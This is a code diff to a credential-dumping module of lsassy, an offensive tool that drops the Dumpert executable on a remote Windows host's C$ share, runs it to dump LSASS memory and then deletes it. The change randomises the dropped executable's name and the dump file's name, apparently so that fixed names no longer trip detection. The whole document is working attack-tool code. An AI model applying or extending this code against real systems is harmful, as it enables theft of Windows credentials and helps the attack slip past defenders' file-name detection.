@@ -1,5 +1,7 @@
 import logging
 import os
+import random
+import string
 
 from lsassy.dumpmethod import IDumpMethod
 from lsassy.impacketfile import ImpacketFile
@@ -9,13 +11,13 @@ class DumpMethod(IDumpMethod):
     custom_dump_path_support = False
     custom_dump_name_support = False
 
-    dump_name = "dumpert.dmp"
+    dump_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(6)) + '.dmp'
     dump_share = "C$"
     dump_path = "\\Windows\\Temp\\"
 
     def __init__(self, session, timeout):
         super().__init__(session, timeout)
-        self.dumpert = "dumpert.exe"
+        self.dumpert = ''.join(random.choice(string.ascii_lowercase) for _ in range(6)) + '.exe'
         self.dumpert_path = False
         self.dumpert_remote_share = "C$"
         self.dumpert_remote_path = "\\Windows\\Temp\\"
@@ -53,7 +55,7 @@ class DumpMethod(IDumpMethod):
             ImpacketFile.delete(self._session, self.dumpert_remote_path + self.dumpert, timeout=self._timeout)
 
     def get_commands(self):
-        cmd_command = """{}{}""".format(self.dumpert_remote_path, self.dumpert)
+        cmd_command = """{}{} {}""".format(self.dumpert_remote_path, self.dumpert, self.dump_name)
         pwsh_command = cmd_command
         return {
             "cmd": cmd_command,
